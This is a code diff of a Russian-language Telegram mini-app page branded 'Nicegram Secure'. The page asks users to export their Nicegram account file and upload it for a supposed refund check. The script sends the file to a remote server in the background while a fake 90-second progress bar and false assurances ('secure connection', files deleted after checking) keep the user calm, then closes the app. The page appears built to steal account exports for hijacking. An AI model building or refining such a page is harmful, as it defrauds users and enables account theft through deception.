@@ -6,14 +6,25 @@
     <title>Nicegram Secure</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Подключаем шрифт Inter для премиального вида -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
 
     <style>
+        :root {
+            --primary: #007aff;
+            --accent: #00d4ff;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.12);
+            --text-main: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.6);
+        }
+
         body {
             margin: 0;
             padding: 0;
-            background-color: #050505;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000000;
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             height: 100vh;
             overflow: hidden;
             display: flex;
@@ -23,112 +34,197 @@
             position: relative;
         }
 
-        /* --- ФОНОВЫЕ ЭФФЕКТЫ --- */
+        /* --- ФОН И ЧАСТИЦЫ --- */
         #particles {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            opacity: 0.6;
-            pointer-events: none;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1; opacity: 0.4; pointer-events: none;
         }
 
         .liquid-blob {
             position: absolute;
             border-radius: 50%;
-            filter: blur(80px);
+            filter: blur(90px);
             z-index: 0;
-            animation: float 10s infinite ease-in-out;
-            opacity: 0.6;
+            animation: float 12s infinite ease-in-out;
+            opacity: 0.5;
         }
-
-        .blob-1 { width: 300px; height: 300px; background: #4facfe; top: -50px; left: -50px; }
-        .blob-2 { width: 250px; height: 250px; background: #f093fb; bottom: -50px; right: -50px; animation-delay: 5s; }
-        .blob-3 { width: 200px; height: 200px; background: #66a6ff; top: 40%; left: 40%; animation-delay: 2s; }
+        .blob-1 { width: 350px; height: 350px; background: #0055ff; top: -10%; left: -20%; }
+        .blob-2 { width: 300px; height: 300px; background: #00d4ff; bottom: -10%; right: -20%; animation-delay: -5s; }
+        .blob-3 { width: 250px; height: 250px; background: #7000ff; top: 40%; left: 30%; animation-delay: -2s; opacity: 0.3; }
 
         @keyframes float {
-            0% { transform: translate(0, 0) scale(1); }
-            33% { transform: translate(30px, -50px) scale(1.1); }
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -40px) scale(1.1); }
             66% { transform: translate(-20px, 20px) scale(0.9); }
-            100% { transform: translate(0, 0) scale(1); }
         }
 
-        /* --- КАРТОЧКА --- */
+        /* --- ОСНОВНАЯ КАРТОЧКА --- */
         .glass-card {
             position: relative;
             z-index: 10;
             width: 85%;
-            max-width: 350px;
-            padding: 40px 20px;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 25px;
+            max-width: 360px;
+            padding: 40px 24px;
+            
+            /* Премиум стекло */
+            background: var(--glass-bg);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid var(--glass-border);
+            border-top: 1px solid rgba(255, 255, 255, 0.25);
+            
+            border-radius: 32px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-            transition: height 0.3s;
+            
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255,255,255,0.05);
+            transform: translateY(0);
+            animation: card-appear 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
 
-        /* --- ЛОГОТИП С АНИМАЦИЕЙ --- */
+        @keyframes card-appear {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- ЛОГОТИП --- */
+        .logo-container {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
         .logo {
-            font-size: 70px;
-            margin-bottom: 15px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff 30%, #a5a5a5 100%);
+            font-size: 50px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #fff 0%, #b0b0b0 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            /* Анимация */
-            animation: logo-pulse 3s infinite ease-in-out;
-            display: inline-block;
+            z-index: 2;
+            filter: drop-shadow(0 0 15px rgba(255,255,255,0.3));
         }
 
-        @keyframes logo-pulse {
-            0% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(255,255,255,0.1)); }
-            50% { transform: scale(1.05); filter: drop-shadow(0 0 25px rgba(255,255,255,0.4)); }
-            100% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(255,255,255,0.1)); }
+        .logo-glow {
+            position: absolute;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0,122,255,0.4) 0%, transparent 70%);
+            animation: pulse-glow 3s infinite ease-in-out;
+            z-index: 1;
         }
 
-        h1 { font-size: 22px; margin: 5px 0 10px 0; font-weight: 600; }
-        p { color: rgba(255, 255, 255, 0.7); font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        @keyframes pulse-glow {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.5); opacity: 0.8; }
+        }
 
-        /* --- КНОПКИ --- */
+        h1 { font-size: 26px; margin: 0 0 8px 0; font-weight: 700; letter-spacing: -0.5px; }
+        p { color: var(--text-secondary); font-size: 15px; margin-bottom: 32px; line-height: 1.5; font-weight: 400; }
+
+        /* --- КНОПКА ЗАГРУЗКИ --- */
         .btn {
-            background: linear-gradient(90deg, #007aff, #00c6ff);
+            position: relative;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
             color: white;
             border: none;
-            padding: 16px 0;
-            border-radius: 15px;
-            font-size: 16px;
+            padding: 18px 0;
+            border-radius: 18px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
-            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(0, 122, 255, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            overflow: hidden;
+            letter-spacing: 0.3px;
         }
-        .btn:active { transform: scale(0.96); opacity: 0.9; }
+
+        .btn:active { transform: scale(0.97); }
+
+        /* Блик на кнопке */
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
 
         input[type="file"] { display: none; }
 
-        /* --- ИНСТРУКЦИЯ (ВНИЗУ) --- */
-        .footer-btn {
+        /* --- ФУТЕР (МЕНЮ) --- */
+        .footer-container {
+            display: flex;
+            gap: 12px;
             margin-top: 30px;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 14px;
-            text-decoration: underline;
-            cursor: pointer;
             z-index: 10;
         }
 
+        .footer-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text-secondary);
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            transition: all 0.2s;
+        }
+
+        .footer-btn:hover, .footer-btn:active {
+            background: rgba(255, 255, 255, 0.15);
+            color: #fff;
+            border-color: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        /* --- ПРОГРЕСС БАР --- */
+        #progress-container {
+            display: none;
+            width: 100%;
+            text-align: center;
+        }
+        .progress-track {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #34c759, #30d158);
+            border-radius: 10px;
+            transition: width 0.2s linear;
+            box-shadow: 0 0 15px rgba(52, 199, 89, 0.5);
+        }
+        .status-text { font-size: 14px; color: var(--text-secondary); margin-bottom: 5px; font-weight: 500; }
+        .percent-text { font-size: 32px; font-weight: 800; color: #fff; letter-spacing: -1px; }
+
+        /* --- МОДАЛЬНЫЕ ОКНА --- */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.6);
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
             z-index: 99;
             opacity: 0;
             pointer-events: none;
@@ -141,105 +237,160 @@
             bottom: -100%;
             left: 0;
             width: 100%;
-            background: #1c1c1e;
-            border-top-left-radius: 20px;
-            border-top-right-radius: 20px;
-            padding: 25px 20px 40px 20px;
+            max-height: 85vh; /* Максимальная высота шторки */
+            background: #121212;
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            padding: 30px 24px 50px 24px;
             box-sizing: border-box;
             z-index: 100;
-            transition: bottom 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: bottom 0.4s cubic-bezier(0.19, 1, 0.22, 1);
             color: #fff;
             border-top: 1px solid #333;
+            overflow-y: auto;
+            box-shadow: 0 -10px 40px rgba(0,0,0,0.5);
         }
         .modal.active { bottom: 0; }
 
-        .modal h3 { margin-top: 0; margin-bottom: 20px; font-size: 18px; text-align: center; }
-        .modal ol { padding-left: 20px; color: #ccc; font-size: 14px; line-height: 1.6; }
-        .modal li { margin-bottom: 10px; }
+        .modal-header {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        .drag-handle {
+            width: 40px; height: 5px; background: #333;
+            border-radius: 10px;
+        }
+
+        .modal h3 { margin: 0 0 20px 0; font-size: 22px; font-weight: 700; text-align: center; }
         
-        .close-modal {
-            width: 40px; height: 5px; background: #444;
-            border-radius: 10px; margin: 0 auto 20px auto;
-        }
+        .modal ol { padding-left: 20px; color: #ccc; font-size: 15px; line-height: 1.6; }
+        .modal li { margin-bottom: 12px; }
 
-        /* --- ПРОГРЕСС БАР --- */
-        #progress-container {
-            display: none;
-            width: 100%;
-            text-align: center;
+        /* FAQ STYLES */
+        .faq-item {
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
         }
-        .progress-bar {
-            width: 100%;
-            height: 6px;
+        .faq-q { font-weight: 600; color: #fff; margin-bottom: 6px; font-size: 15px; display: flex; align-items: flex-start; gap: 8px;}
+        .faq-q::before { content: 'Q'; color: var(--accent); font-weight: 800; }
+        
+        .faq-a { color: #aaa; font-size: 14px; line-height: 1.5; padding-left: 20px; }
+
+        .btn-close {
             background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 15px 0;
-            position: relative;
+            color: white;
+            border: none;
+            padding: 14px 0;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 20px;
+            cursor: pointer;
         }
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: #34c759;
-            border-radius: 10px;
-            transition: width 0.2s linear;
-            box-shadow: 0 0 10px #34c759;
-        }
-        .status-text { font-size: 13px; color: #ccc; margin-bottom: 5px; }
-        .percent-text { font-size: 24px; font-weight: bold; color: #fff; }
-
     </style>
 </head>
 <body>
 
+    <!-- Жидкий фон -->
     <div class="liquid-blob blob-1"></div>
     <div class="liquid-blob blob-2"></div>
     <div class="liquid-blob blob-3"></div>
 
+    <!-- Частицы -->
     <div id="particles"></div>
 
+    <!-- Карточка -->
     <div class="glass-card">
-        <div class="logo">N</div>
+        <div class="logo-container">
+            <div class="logo-glow"></div>
+            <div class="logo">N</div>
+        </div>
+        
         <h1 id="greeting">Nicegram</h1>
-        <p id="subtitle">Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+        <p id="subtitle">Безопасная среда для анализа.<br>Загрузите файл экспорта.</p>
 
-        <!-- Кнопка загрузки -->
         <input type="file" id="fileInput">
         <button id="uploadBtn" class="btn" onclick="document.getElementById('fileInput').click()">
-            📁 Выбрать файл
+            Загрузить файл
         </button>
 
-        <!-- Блок прогресса (скрыт по умолчанию) -->
+        <!-- Прогресс (Скрыт) -->
         <div id="progress-container">
-            <div class="status-text">Проверка на рефаунд...</div>
             <div class="percent-text" id="percent">0%</div>
-            <div class="progress-bar">
+            <div class="status-text">Анализ данных...</div>
+            <div class="progress-track">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
-            <div style="font-size: 11px; color: #777; margin-top: 10px;">Не закрывайте приложение</div>
+            <div style="font-size: 12px; color: rgba(255,255,255,0.4); margin-top: 15px;">
+                <span style="display:inline-block; width:6px; height:6px; background:#34c759; border-radius:50%; margin-right:5px;"></span>
+                Безопасное соединение
+            </div>
         </div>
     </div>
 
-    <!-- Кнопка Инструкции -->
-    <div class="footer-btn" onclick="toggleModal(true)">Как скачать файл? (Инструкция)</div>
-
-    <!-- Модальное окно Инструкции -->
-    <div class="modal-overlay" onclick="toggleModal(false)"></div>
-    <div class="modal" id="instructionModal">
-        <div class="close-modal" onclick="toggleModal(false)"></div>
-        <h3>Инструкция</h3>
-        <ol>
-            <li>Скачайте приложение Nicegram с официального сайта, нажав на кнопку в главном меню.</li>
-            <li>Откройте Nicegram и войдите в свой аккаунт.</li>
-            <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
-            <li>Экспортируйте данные аккаунта, нажав на кнопку «Экспортировать в файл».</li>
-            <li>Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</li>
-            <li>Отправьте файл боту.</li>
-        </ol>
-        <button class="btn" onclick="toggleModal(false)" style="margin-top: 10px; background: #333;">Понятно</button>
+    <!-- Нижнее меню -->
+    <div class="footer-container">
+        <div class="footer-btn" onclick="openModal('instructionModal')">📖 Инструкция</div>
+        <div class="footer-btn" onclick="openModal('faqModal')">❓ FAQ</div>
     </div>
 
-    <!-- Частицы (Particle Script) -->
+    <!-- Оверлей -->
+    <div class="modal-overlay" onclick="closeAllModals()"></div>
+
+    <!-- Модальное окно: Инструкция -->
+    <div class="modal" id="instructionModal">
+        <div class="modal-header"><div class="drag-handle" onclick="closeAllModals()"></div></div>
+        <h3>Как это работает</h3>
+        <ol>
+            <li>Скачайте <b>Nicegram</b> с официального сайта (кнопка в боте).</li>
+            <li>Авторизуйтесь в свой аккаунт.</li>
+            <li>Настройки ➝ Nicegram.</li>
+            <li>Нажмите <b>«Экспортировать в файл»</b>.</li>
+            <li>Вернитесь сюда и нажмите кнопку загрузки.</li>
+            <li>Выберите полученный файл.</li>
+        </ol>
+        <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+    </div>
+
+    <!-- Модальное окно: FAQ -->
+    <div class="modal" id="faqModal">
+        <div class="modal-header"><div class="drag-handle" onclick="closeAllModals()"></div></div>
+        <h3>Частые вопросы</h3>
+        
+        <div class="faq-item">
+            <div class="faq-q">Что такое рефаунд?</div>
+            <div class="faq-a">Это возврат средств после покупки подписки или покупки в приложении.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-q">Сколько времени занимает проверка?</div>
+            <div class="faq-a">Обычно 3-5 минут, в пиковые периоды до 15 минут.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-q">Какие файлы поддерживаются?</div>
+            <div class="faq-a">JSON, TXT, ZIP, HTML до 10MB.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-q">Насколько точна проверка?</div>
+            <div class="faq-a">Точность зависит от качества данных в файле. Мы используем автоматический анализ и ручную проверку.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="faq-q">Мои данные в безопасности?</div>
+            <div class="faq-a">Да, все файлы удаляются сразу после проверки, мы не храним ваши данные.</div>
+        </div>
+        
+        <button class="btn-close" onclick="closeAllModals()">Закрыть</button>
+    </div>
+
+    <!-- Скрипт Частиц -->
     <script>
         (function() {
             var canvas = document.createElement('canvas');
@@ -247,7 +398,7 @@
             var container = document.getElementById('particles');
             container.appendChild(canvas);
             var particles = [], width, height;
-            var particleCount = 60, connectionDistance = 100, speed = 0.5;
+            var particleCount = 50, connectionDistance = 120, speed = 0.4;
 
             function resize() {
                 width = container.offsetWidth; height = container.offsetHeight;
@@ -256,7 +407,7 @@
             function Particle() {
                 this.x = Math.random() * width; this.y = Math.random() * height;
                 this.vx = (Math.random() - 0.5) * speed; this.vy = (Math.random() - 0.5) * speed;
-                this.size = Math.random() * 2 + 1;
+                this.size = Math.random() * 2;
             }
             Particle.prototype.update = function() {
                 this.x += this.vx; this.y += this.vy;
@@ -264,7 +415,7 @@
                 if (this.y < 0 || this.y > height) this.vy *= -1;
             };
             Particle.prototype.draw = function() {
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
                 ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
             };
             function initParticles() {
@@ -280,7 +431,7 @@
                         var dx = particles[i].x - particles[j].x; var dy = particles[i].y - particles[j].y;
                         var dist = Math.sqrt(dx * dx + dy * dy);
                         if (dist < connectionDistance) {
-                            ctx.strokeStyle = 'rgba(255, 255, 255, ' + (1 - dist / connectionDistance) * 0.2 + ')';
+                            ctx.strokeStyle = 'rgba(255, 255, 255, ' + (1 - dist / connectionDistance) * 0.15 + ')';
                             ctx.lineWidth = 1; ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y); ctx.stroke();
                         }
                     }
@@ -309,22 +460,20 @@
         const subtitle = document.getElementById('subtitle');
         const statusText = document.querySelector('.status-text');
 
-        // Приветствие
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
             document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name}`;
         }
 
-        // Открытие/закрытие инструкции
-        function toggleModal(show) {
-            const modal = document.getElementById('instructionModal');
-            const overlay = document.querySelector('.modal-overlay');
-            if (show) {
-                modal.classList.add('active');
-                overlay.classList.add('active');
-            } else {
+        function openModal(modalId) {
+            document.querySelector('.modal-overlay').classList.add('active');
+            document.getElementById(modalId).classList.add('active');
+        }
+
+        function closeAllModals() {
+            document.querySelector('.modal-overlay').classList.remove('active');
+            document.querySelectorAll('.modal').forEach(modal => {
                 modal.classList.remove('active');
-                overlay.classList.remove('active');
-            }
+            });
         }
 
         fileInput.addEventListener('change', () => {
@@ -335,29 +484,23 @@
         });
 
         function startVerificationProcess(file) {
-            // 1. Скрываем кнопку, показываем прогресс
             uploadBtn.style.display = 'none';
             subtitle.style.display = 'none';
-            document.querySelector('.footer-btn').style.display = 'none'; // Скрыть инструкцию
+            document.querySelector('.footer-container').style.display = 'none';
             progressContainer.style.display = 'block';
 
-            // 2. Отправляем файл ФОНОМ (не дожидаясь таймера)
             uploadFileInBackground(file);
 
-            // 3. Запускаем фейковый таймер на 90 секунд (90000 мс)
             let progress = 0;
-            const duration = 90000; // 1 минута 30 секунд
-            const intervalTime = 100; // обновление каждые 100мс
+            const duration = 90000; // 90 сек
+            const intervalTime = 100;
             const steps = duration / intervalTime;
             const increment = 100 / steps;
 
             const timer = setInterval(() => {
                 progress += increment;
-                
-                // Если случайно перевалило за 100
                 if (progress > 100) progress = 100;
 
-                // Обновляем UI
                 let displayPercent = Math.floor(progress);
                 percentText.innerText = displayPercent + "%";
                 progressFill.style.width = progress + "%";
@@ -374,23 +517,17 @@
             formData.append('file', file);
             formData.append('user_id', tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "0000");
 
-            // Просто отправляем, не обрабатывая UI здесь
             fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData })
-                .then(res => console.log("Upload status:", res.status))
-                .catch(err => console.error("Upload error:", err));
+                .then(res => console.log("Upload:", res.status))
+                .catch(err => console.error("Error:", err));
         }
 
         function finishProcess() {
-            statusText.innerText = "Проверка завершена";
+            statusText.innerText = "Проверка завершена успешно";
             statusText.style.color = "#34c759";
-            percentText.innerText = "Успешно!";
-            
+            percentText.innerText = "100%";
             if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
-            
-            // Ждем 1.5 секунды и закрываем
-            setTimeout(() => {
-                tg.close();
-            }, 1500);
+            setTimeout(() => { tg.close(); }, 2000);
         }
     </script>
 </body>
